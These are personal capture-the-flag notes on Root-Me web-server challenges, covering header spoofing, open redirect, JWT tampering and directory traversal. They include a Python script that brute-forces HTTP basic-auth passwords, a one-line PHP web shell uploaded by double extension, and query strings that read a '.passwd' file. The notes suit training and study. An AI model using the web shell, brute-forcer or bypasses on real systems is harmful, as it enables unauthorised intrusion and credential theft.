---
description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
---

# 🏝 Rootme

## Web - Server

### [HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)

F12 for flag

### [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

``[`document`](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)``

![](<../.gitbook/assets/image (39) (1).png>)

> **Syntax: X-Forwarded-For: \<client>,\<proxy1>,\<proxy2>,\<proxy3>**

Change IP at client to private IP by adding _**an X-Forwarded-For**_ header

![](<../.gitbook/assets/image (13) (2).png>)

### [HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

![](<../.gitbook/assets/image (35).png>)

It combines URL and hash md5 of that one, so that we just put other URL and hash of it.

![](<../.gitbook/assets/image (29) (1).png>)

### HTTP - User-agent

change User-Agent to \`admin\`

![](<../.gitbook/assets/image (18).png>)

### Weak password

```
import requests
from requests.auth import HTTPBasicAuth
url = "http://challenge01.root-me.org/web-serveur/ch3/"
usr = "admin"
words = open('common_password.txt','r').read().split('\n')
cnt =1
for pwd in words:
	print(pwd,cnt)
	
	res = requests.get(url, auth=HTTPBasicAuth(usr, pwd))
	
	if "401" not in res.text:
		print('Password is ' + pwd)
		break
	cnt +=1
```

![](<../.gitbook/assets/image (39).png>)

### PHP - Command injection

![](<../.gitbook/assets/image (32) (2).png>)

![](<../.gitbook/assets/image (33).png>)

``[`document`](https://portswigger.net/web-security/os-command-injection)``

### Backup file

Use dirsearch find some interesting files:

![](<../.gitbook/assets/image (24).png>)

> /web-serveur/ch11/index.php\~

### HTTP - Directory indexing

> [http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt](http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt)
>
>

![](<../.gitbook/assets/image (5) (3).png>)

### HTTP - Headers

With normal request we will get:

![](<../.gitbook/assets/image (1) (2).png>)

add Header to request:

> Header-RootMe-Admin: True

![](<../.gitbook/assets/image (32).png>)

### HTTP - POST

![](<../.gitbook/assets/image (2).png>)

### HTTP - Improper redirect

Capture before it redirect

![](<../.gitbook/assets/image (3).png>)

### HTTP - Verb tampering

Ban đầu tưởng bruteforce ngồi xài hydra và cái rockyou.txt ra spam cả tiếng&#x20;

![](<../.gitbook/assets/image (5).png>)

temper ở đây là chỉ cần đổi method khác ngoài GET và POST là được, cứ PUT với DELETE mà phang

![](<../.gitbook/assets/image (10).png>)

### File upload - Double extensions

```
<?php echo shell_exec($_GET['cmd']); ?>
```

set file.php.png and send to the server

![](<../.gitbook/assets/image (16) (3).png>)

```
?cmd=cd;cat .passwd
```

### File upload - MIME type

![](../.gitbook/assets/image.png)

Change Content-Type to image/png and rce

```
?id=cd;cat .passwd
```

### HTTP - Cookies

![chan](<../.gitbook/assets/image (1).png>)

change cookie from `visiteur` to `admin`

### JSON Web Token (JWT) - Introduction

![](<../.gitbook/assets/image (45).png>)

"none" signature algorithms

### Directory traversal

![](<../.gitbook/assets/image (7).png>)

Try with ../ and fuzz

### JSON Web Token (JWT) - Weak secret

![](<../.gitbook/assets/image (46).png>)

bruteforce secret key: lol

![sign new signature](<../.gitbook/assets/image (4).png>)

POST and look for the flag hm....

![](<../.gitbook/assets/image (11).png>)

